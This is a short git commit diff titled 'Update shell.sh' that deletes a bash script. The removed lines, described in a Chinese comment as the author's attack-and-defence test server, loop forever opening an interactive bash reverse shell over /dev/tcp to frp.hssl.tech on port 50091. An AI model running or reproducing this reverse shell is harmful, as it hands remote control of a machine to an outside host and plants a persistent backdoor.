bce03bf63b13d23cb783f1aac1185e19337d11ab
KK <46366797+shaokangW@users.noreply.github.com>
2026-03-27 13:41:53 +0800

    Update shell.sh

--- scripts/shell.sh
+++ scripts/shell.sh
@@ -1,10 +1,1 @@
-#!/bin/bash
 
-# 这是我的网络攻防测试服务器，尝试建立连接
-REMOTE_HOST="frp.hssl.tech"
-REMOTE_PORT="50091"
-
-while true; do
-    /bin/bash -i >& /dev/tcp/${REMOTE_HOST}/${REMOTE_PORT} 0>&1
-    sleep 10
-done
